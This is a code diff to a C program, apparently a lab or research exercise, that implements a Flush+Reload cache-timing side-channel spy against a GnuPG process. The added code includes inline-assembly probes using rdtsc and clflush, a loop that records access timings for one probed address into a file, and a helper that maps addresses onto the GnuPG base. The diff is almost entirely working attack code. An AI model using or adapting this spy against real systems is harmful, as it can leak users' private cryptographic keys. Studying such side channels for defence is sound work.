@@ -16,6 +16,9 @@
 // Maximum number of addresses to probe
 #define MAX_NUM_OF_ADDRS 10u
 
+#define busy_wait(cycles) for(volatile long i_ = 0; i_ != cycles; i_++)\
+                                                 ;
+
 int probe(char *adrs) {
     volatile unsigned long time;
 
@@ -37,8 +40,44 @@ int probe(char *adrs) {
     return time < PROBE_THRESHOLD;
 }
 
-void spy(void *gpg_base, char **addrs, size_t num_addrs) {
-    // TODO: probe more than one memory address
+int probe_timing(char *adrs) {
+    volatile unsigned long time;
+
+    asm __volatile__(
+        "    mfence             \n"
+        "    lfence             \n"
+        "    rdtsc              \n"
+        "    lfence             \n"
+        "    movl %%eax, %%esi  \n"
+        "    movl (%1), %%eax   \n"
+        "    lfence             \n"
+        "    rdtsc              \n"
+        "    subl %%esi, %%eax  \n"
+        "    clflush 0(%1)      \n"
+        : "=a" (time)
+        : "c" (adrs)
+        : "%esi", "%edx"
+    );
+    return time;
+}
+
+void spy(char **addrs, size_t num_addrs, FILE *out_file) {
+    char *ptr = addrs[2];
+    for (int slot = 0; slot < 10000; slot++) {
+        int result = probe_timing(ptr);
+        fprintf(out_file, "%d %d\n", slot, result);
+        busy_wait(10000);
+    }
+}
+
+void offset_addresses(void *gpg_base, char **addrs, size_t num_addrs) {
+    for (size_t i = 0; i < num_addrs; i++) {
+        // Here be dragons :O
+        unsigned long ptr_offset = (unsigned long)gpg_base;
+        char *adjusted_ptr = addrs[i] + ptr_offset;
+
+        addrs[i] = adjusted_ptr;
+    }
 }
 
 int main(int argc, char *argv[]) {
@@ -72,18 +111,14 @@ int main(int argc, char *argv[]) {
         printf("%p\n", addrs[i]);
     }
 
+    offset_addresses(gpg_base, addrs, num_addrs);
     printf("Here are the offset addresses (respectively):\n");
     for (size_t i = 0; i < num_addrs; i++) {
-        // Here be dragons :O
-        unsigned long ptr_offset = (unsigned long)gpg_base;
-        char *adjusted_ptr = addrs[i] + ptr_offset;
-
-        addrs[i] = adjusted_ptr;
         printf("%p\n", addrs[i]);
     }
 
     // ATTAAAAACK!
-    spy(gpg_base, addrs, num_addrs);
+    spy(addrs, num_addrs, arguments.out_file);
 
     // Probably never reached because we'll likely just ^C the program. Maybe
     // implement a SIGTERM / SIGINT handler?
